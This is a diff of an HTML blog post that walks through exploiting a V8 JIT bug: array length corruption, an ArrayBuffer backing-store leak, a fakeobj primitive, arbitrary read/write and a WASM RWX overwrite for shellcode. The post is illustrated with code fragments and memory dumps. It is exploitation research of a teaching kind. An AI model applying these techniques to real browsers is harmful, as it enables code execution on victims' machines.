 <h2 id="step-0-corrupting-a-fixeddoublearray">Step 0 : Corrupting a FixedDoubleArray</h2>
@@ -1151,6 +1202,7 @@ Also, I use an <code>ArrayBuffer</code> with two views: one <code>Float64Array</
 <span class="kd">let</span> <span class="nx">res</span> <span class="o">=</span> <span class="nx">opt_me</span><span class="p">(</span><span class="s2">&quot;foo&quot;</span><span class="p">);</span>
 </code></pre></div>
 
+
 <p>That gives the following results : </p>
 <div class="highlight"><pre><span></span><code><span class="n">oob</span> <span class="n">index</span> <span class="n">is</span> <span class="mi">4</span>
 <span class="n">length</span> <span class="n">is</span> <span class="mi">3</span>
@@ -1173,6 +1225,7 @@ Also, I use an <code>ArrayBuffer</code> with two views: one <code>Float64Array</
 <span class="mh">0x00002e5fddf8b708</span>    <span class="mh">0x00002e5fddf8b6d1</span>    <span class="n">FIXED_DOUBLE_ARRAY_TYPE</span>   
 </code></pre></div>
 
+
 <p>Obviously, both <code>FixedDoubleArray</code> of <code>arr</code> and <code>arr2</code> are contiguous. 
 At <code>arr[3]</code> we've got <code>arr2</code>'s map and at <code>arr[4]</code>  we've got <code>arr2</code>'s elements length (encoded as an Smi, which is <a href="https://github.com/v8/v8/blob/a9e3d9c7ec1345085c861af76e508d9591634530/include/v8.h#L225">32 bits even on 64 bit platforms</a>).
 Please note that we changed a little bit the trigger code : </p>
@@ -1180,6 +1233,7 @@ Please note that we changed a little bit the trigger code : </p>
 <span class="gd">---</span>
 &gt; let arr = new Array(1.1,1.2,1.3);
 </code></pre></div>
+
 
 <p>Otherwise we would read/write the <code>map</code> instead, as demonstrates the following dump : </p>
 <div class="highlight"><pre><span></span><code><span class="n">oob</span> <span class="n">index</span> <span class="n">is</span> <span class="mi">4</span>
@@ -1203,6 +1257,7 @@ Please note that we changed a little bit the trigger code : </p>
 <span class="mh">0x0000108bcf50b720</span>    <span class="mh">0x0000057520400c19</span>    <span class="n">FIXED_ARRAY_TYPE</span>   
 </code></pre></div>
 
+
 <h2 id="step-1-corrupting-a-jsarray-and-leaking-an-arraybuffers-backing-store">Step 1 : Corrupting a JSArray and leaking an ArrayBuffer's backing store</h2>
 <p>The problem with step 0 is that we merely overwrite the <code>FixedDoubleArray</code>'s length ... which is pretty useless because it is not the field actually controlling the JSArray’s length the way we expect it, it just gives information about the memory allocated for the fixed array. Actually, the only <code>length</code> we want to corrupt is the one from the <code>JSArray</code>.</p>
 <p>Indeed, the length of the <code>JSArray</code> is not necessarily the same as the length of the underlying <code>FixedArray</code> (or <code>FixedDoubleArray</code>).  Let's quickly check that.</p>
@@ -1225,6 +1280,7 @@ DebugPrint: 0xd893a90aed1: [JSArray]
  }
 </code></pre></div>
 
+
 <p>In this case, even though the length of the <code>JSArray</code> is <code>1</code>, the underlying <code>FixedArray</code> as a length of <code>17</code>, which is just fine! But that is something that you want to keep in mind.</p>
 <p>If you want to get an OOB R/W primitive that's the <code>JSArray</code>'s length that you want to overwrite. Also if you were to have an out-of-bounds access on such an array, you may want to check that the size of the underlying fixed array is not too big. So, let's tweak a bit our code to target the <code>JSArray</code>'s length!</p>
 <p>If you look at the memory dump, you may think that having the allocated <code>JSArray</code> <em>before</em> the <code>FixedDoubleArray</code> mightbe convenient, right?</p>
@@ -1234,6 +1290,7 @@ DebugPrint: 0xd893a90aed1: [JSArray]
 <span class="err">JS_ARRAY_TYPE</span>
 </code></pre></div>
 
+
 <p>Let's simply change the way we are allocating the second array.</p>
 <div class="highlight"><pre><span></span><code>23c23
 &lt;   arr2 = new Array(42.1,42.0,42.0);
@@ -1241,11 +1298,13 @@ DebugPrint: 0xd893a90aed1: [JSArray]
 &gt;   arr2 = Array.of(42.1,42.0,42.0);
 </code></pre></div>
 
+
 <p>Now we have the following layout</p>
 <div class="highlight"><pre><span></span><code>FIXED_DOUBLE_ARRAY_TYPE
 JS_ARRAY_TYPE
 FIXED_DOUBLE_ARRAY_TYPE
 </code></pre></div>
+
 
 <div class="highlight"><pre><span></span><code>oob index is 4
 length is 3
@@ -1263,6 +1322,7 @@ leaked 0x000009d6e6600c19
 0x000032adcd10b6f8    0x0000000300000000    
 </code></pre></div>
 
+
 <p>Cool, now we are able to access the <code>JSArray</code> instead of the <code>FixedDoubleArray</code>. However, we're accessing its <code>properties</code> field. </p>
 <p>Thanks to the precision loss when transforming <code>+1+1</code> into <code>+2</code> we get a difference of <code>2</code> between the computations. If we get a difference of <code>4</code>, we'll be at the right offset. Transforming <code>+1+1+1</code> into <code>+3</code> will give us this!</p>
 <div class="highlight"><pre><span></span><code><span class="err">d8&gt; x + 1 + 1 + 1</span>
@@ -1271,11 +1331,13 @@ leaked 0x000009d6e6600c19
 <span class="err">9007199254740996</span>
 </code></pre></div>
 
+
 <div class="highlight"><pre><span></span><code>26c26
 &lt;   z = z + 1 + 1;
 <span class="gd">---</span>
 &gt;   z = z + 1 + 1 + 1;
 </code></pre></div>
+
 
 <p>Now we are able to read/write the <code>JSArray</code>'s length. </p>
 <div class="highlight"><pre><span></span><code>oob index is 6
@@ -1294,11 +1356,13 @@ leaked 0x0000000300000000
 0x000004144950b720    0x0000000300000000    // arr[6]
 </code></pre></div>
 
+
 <p>Now to leak the <code>ArrayBuffer</code>'s data, it's very easy. Just allocate it right after the second <code>JSArray</code>.</p>
 <div class="highlight"><pre><span></span><code><span class="err">  let arr = new Array(MAGIC,MAGIC,MAGIC);</span>
 <span class="err">  arr2 = Array.of(1.2); // allows to put the JSArray *before* the fixed arrays</span>
 <span class="err">  ab = new ArrayBuffer(AB_LENGTH);</span>
 </code></pre></div>
+
 
 <p>This way, we get the following memory layout : </p>
 <div class="highlight"><pre><span></span><code>----- [ FIXED_DOUBLE_ARRAY_TYPE : 0x28 ] -----
@@ -1331,6 +1395,7 @@ leaked 0x0000000300000000
 0x00003a4d7608bbf8    0x0000000000000000   
 </code></pre></div>
 
+
 <p>We can simply use the corrupted <code>JSArray</code> (<code>arr2</code>) to read the <code>ArrayBuffer</code> (<code>ab</code>).  This will be useful later because memory pointed to by the <code>backing_store</code> is fully controlled by us, as we can put arbitrary data in it, through a data view (like a <code>Uint32Array</code>).</p>
 <p>Now that we know a pointer to some fully controlled content, let's go to step 2!</p>
 <h2 id="step-2-getting-a-fake-object">Step 2 : Getting a fake object</h2>
@@ -1346,6 +1411,7 @@ leaked 0x0000000300000000
 <span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">elements</span><span class="w"> </span><span class="nl">kind</span><span class="p">:</span><span class="w"> </span><span class="n">PACKED_ELEMENTS</span><span class="w"></span>
 </code></pre></div>
 
+
 <p>Therefore if you can corrupt the content of an array of <code>PACKED_ELEMENTS</code>, you can put in a pointer to a crafted object. This is basically the idea behind the <a href="http://www.phrack.org/papers/attacking_javascript_engines.html">fakeobj primitive</a>. The idea is to simply put the address <code>backing_store+1</code> in this array (the original pointer is not tagged, v8 expect pointers to JavaScript objects to be tagged). Let's first simply write the value <code>0x4141414141</code> in the controlled memory. </p>
 <p>Indeed, we know that the very first field of any object is a a pointer to a <code>map</code> (long story short, the map is the object that describes the type of the object. Other engines call it a <code>Shape</code> or a <code>Structure</code>. If you want to know more, just read <a href="https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation/#shapes">the previous post on SpiderMonkey</a> or <a href="https://mathiasbynens.be/notes/shapes-ics">this blog post</a>).</p>
 <p>Therefore, if v8 indeed considers our pointer as an object pointer, when trying to use it, we should expect a crash when dereferencing the <code>map</code>.</p>
@@ -1355,6 +1421,7 @@ leaked 0x0000000300000000
   <span class="nx">evil_ab</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="nx">AB_LENGTH</span><span class="p">);</span>
   <span class="nx">packed_elements_array</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">.</span><span class="k">of</span><span class="p">(</span><span class="nx">MARK1SMI</span><span class="p">,</span><span class="nb">Math</span><span class="p">,</span><span class="nx">MARK2SMI</span><span class="p">);</span>
 </code></pre></div>
+
 
 <p>Quickly check the memory layout.</p>
 <div class="highlight"><pre><span></span><code><span class="o">-----</span> <span class="p">[</span> <span class="nl">FIXED_DOUBLE_ARRAY_TYPE</span> <span class="p">:</span> <span class="mh">0x28</span> <span class="p">]</span> <span class="o">-----</span>
@@ -1398,6 +1465,7 @@ leaked 0x0000000300000000
 <span class="mh">0x0000220f2ec82508</span>    <span class="mh">0x0000003700000000</span>    <span class="c1">// MARK 2 for memory scanning</span>
 </code></pre></div>
 
+
 <p>Good, the <code>FixedArray</code> with the pointer to the <code>Math</code> object is located right after the <code>ArrayBuffer</code>. Observe that we put markers so as to scan memory instead of hardcoding offsets (which would be bad if we were to have a different memory layout for whatever reason).</p>
 <p>After locating the (oob) index to the object pointer, simply overwrite it and use it.</p>
 <div class="highlight"><pre><span></span><code><span class="kd">let</span> <span class="nx">view</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="nx">evil_ab</span><span class="p">);</span>
@@ -1406,6 +1474,7 @@ leaked 0x0000000300000000
 <span class="nx">arr2</span><span class="p">[</span><span class="nx">index_to_object_pointer</span><span class="p">]</span> <span class="o">=</span> <span class="nx">tagFloat</span><span class="p">(</span><span class="nx">fbackingstore_ptr</span><span class="p">);</span>
 <span class="nx">packed_elements_array</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nx">x</span><span class="p">;</span> <span class="c1">// crash on 0x414141414141 because it is used as a map pointer</span>
 </code></pre></div>
+
 
 <p>Et voilà!</p>
 <h2 id="step-3-arbitrary-readwrite-primitive">Step 3 : Arbitrary read/write primitive</h2>
@@ -1423,6 +1492,7 @@ leaked 0x0000000300000000
     <span class="kd">let</span> <span class="nx">rw_view</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint32Array</span><span class="p">(</span><span class="nx">packed_elements_array</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
     <span class="nx">rw_view</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1337</span><span class="p">;</span> <span class="c1">// *0x42424242 = 0x1337</span>
 </code></pre></div>
+
 
 <p>You should get a crash like this. </p>
 <div class="highlight"><pre><span></span><code>$ d8 rw.js 
@@ -1444,6 +1514,7 @@ Received signal 11 SEGV_MAPERR 000042424242
 [end of stack trace]
 </code></pre></div>
 
+
 <h2 id="step-4-overwriting-wasm-rwx-memory">Step 4 : Overwriting WASM RWX memory</h2>
 <p>Now that's we've got an arbitrary read/write primitive, we simply want to overwrite RWX memory, put a shellcode in it and call it. We'd rather not do any kind of <code>ROP</code> or <code>JIT code reuse</code>(<a href="https://twitter.com/0vercl0k">0vercl0k</a> <a href="https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation/#force-the-jit-of-an-arbitrary-native-payload-bring-your-own-payload">did this for SpiderMonkey</a>). </p>
 <p>V8 used to have the JIT'ed code of its <code>JSFunction</code> located in RWX memory.  But this is <a href="https://cs.chromium.org/chromium/src/v8/src/flag-definitions.h?rcl=dde25872f58951bb0148cf43d6a504ab2f280485&amp;l=717">not the case anymore</a>. However, as <a href="https://twitter.com/anbiondo">Andrea Biondo</a> showed on his blog, <a href="https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/#code-execution">WASM is still using RWX memory</a>. All you have to do is to instantiate a WASM module and from one of its function, simply find the WASM instance object that contains a pointer to the RWX memory in its field <code>JumpTableStart</code>.</p>
@@ -1458,6 +1529,7 @@ Received signal 11 SEGV_MAPERR 000042424242
 <span class="p">[...]</span>
 <span class="mh">0x00002fac7911ec20</span>    <span class="mh">0x0000087e7c50a000</span>    <span class="n">JumpTableStart</span> <span class="p">[</span><span class="n">RWX</span><span class="p">]</span>
 </code></pre></div>
+
 
 <p>So let's just find the RWX memory from a WASM function.</p>
 <p><code>sample_wasm.js</code> can be found <a href="https://github.com/JeremyFetiveau/debugging-tools/blob/master/v8_doare-helpers/samples/sample_wasm.js">here</a>. </p>
@@ -1478,6 +1550,7 @@ Received signal 11 SEGV_MAPERR 000042424242
 <span class="n">function</span> <span class="mi">1</span><span class="p">()</span> <span class="p">{</span> <span class="p">[</span><span class="n">native</span> <span class="n">code</span><span class="p">]</span> <span class="p">}</span>
 </code></pre></div>
 
+
 <div class="highlight"><pre><span></span><code><span class="n">d8</span><span class="o">&gt;</span> <span class="o">%</span><span class="n">DumpObjects</span><span class="p">(</span><span class="mh">0x00002fac7911ecd9</span><span class="p">,</span><span class="mi">11</span><span class="p">)</span>
 <span class="o">-----</span> <span class="p">[</span> <span class="nl">SHARED_FUNCTION_INFO_TYPE</span> <span class="p">:</span> <span class="mh">0x38</span> <span class="p">]</span> <span class="o">-----</span>
 <span class="mh">0x00002fac7911ecd8</span>    <span class="mh">0x00000cdfc0080989</span>    <span class="n">MAP_TYPE</span>    
@@ -1495,6 +1568,7 @@ Received signal 11 SEGV_MAPERR 000042424242
 <span class="mi">52417812098265</span>
 </code></pre></div>
 
+
 <div class="highlight"><pre><span></span><code><span class="n">d8</span><span class="o">&gt;</span> <span class="o">%</span><span class="n">DumpObjects</span><span class="p">(</span><span class="mh">0x00002fac7911ecb1</span><span class="p">,</span><span class="mi">11</span><span class="p">)</span>
 <span class="o">-----</span> <span class="p">[</span> <span class="nl">WASM_EXPORTED_FUNCTION_DATA_TYPE</span> <span class="p">:</span> <span class="mh">0x28</span> <span class="p">]</span> <span class="o">-----</span>
 <span class="mh">0x00002fac7911ecb0</span>    <span class="mh">0x00000cdfc00857a9</span>    <span class="n">MAP_TYPE</span>    
@@ -1511,6 +1585,7 @@ Received signal 11 SEGV_MAPERR 000042424242
 <span class="mh">0x00002fac7911ed00</span>    <span class="mh">0x000000000000004f</span>    
 <span class="mi">52417812098225</span>
 </code></pre></div>
+
 
 <div class="highlight"><pre><span></span><code><span class="n">d8</span><span class="o">&gt;</span> <span class="o">%</span><span class="n">DumpObjects</span><span class="p">(</span><span class="mh">0x00002fac7911eb29</span><span class="p">,</span><span class="mi">41</span><span class="p">)</span>
 <span class="o">-----</span> <span class="p">[</span> <span class="nl">WASM_INSTANCE_TYPE</span> <span class="p">:</span> <span class="mh">0x118</span> <span class="o">:</span> <span class="n">REFERENCES</span> <span class="n">RWX</span> <span class="n">MEMORY</span><span class="p">]</span> <span class="o">-----</span>
@@ -1560,6 +1635,7 @@ Received signal 11 SEGV_MAPERR 000042424242
 <span class="mi">52417812097833</span>
 </code></pre></div>
 
+
 <p>That gives us the following offsets:</p>
 <div class="highlight"><pre><span></span><code><span class="kd">let</span> <span class="nx">WasmOffsets</span> <span class="o">=</span> <span class="p">{</span> 
   <span class="nx">shared_function_info</span> <span class="o">:</span> <span class="mi">3</span><span class="p">,</span>
@@ -1568,6 +1644,7 @@ Received signal 11 SEGV_MAPERR 000042424242
   <span class="nx">jump_table_start</span> <span class="o">:</span> <span class="mi">31</span>
 <span class="p">};</span>
 </code></pre></div>
+
 
 <p>Now simply find the <code>JumpTableStart</code> pointer and modify your crafted <code>ArrayBuffer</code> to overwrite this memory and copy your shellcode in it. Of course, you may want to backup the memory before so as to restore it after!</p>
 <h2 id="full-exploit">Full exploit</h2>
@@ -1754,6 +1831,7 @@ Received signal 11 SEGV_MAPERR 000042424242
 <span class="kd">let</span> <span class="nx">res</span> <span class="o">=</span> <span class="nx">opt_me</span><span class="p">(</span><span class="s2">&quot;foo&quot;</span><span class="p">);</span>
 </code></pre></div>
 
+
 <p><img alt="pwnd" src="/images/swimming-in-a-sea-of-nodes/pop_calc.gif"></p>
 <h1 id="conclusion">Conclusion</h1>
 <p>I hope you enjoyed this article and thank you very much for reading :-) If you have any feedback or questions, just contact me on my twitter <a href="https://twitter.com/__x86">@__x86</a>.</p>
@@ -1791,6 +1869,14 @@ Received signal 11 SEGV_MAPERR 000042424242
 
     </div><!--/.fluid-container-->
 
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src='https://www.googletagmanager.com/gtag/js?id=G-N8HQZ0EFSG'></script>
+<script>
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'UA-43481215-1');
+</script>
 
     <script src="../../../../../theme/js/jquery-1.7.2.min.js"></script>
     <script src="../../../../../theme/js/bootstrap.min.js"></script>
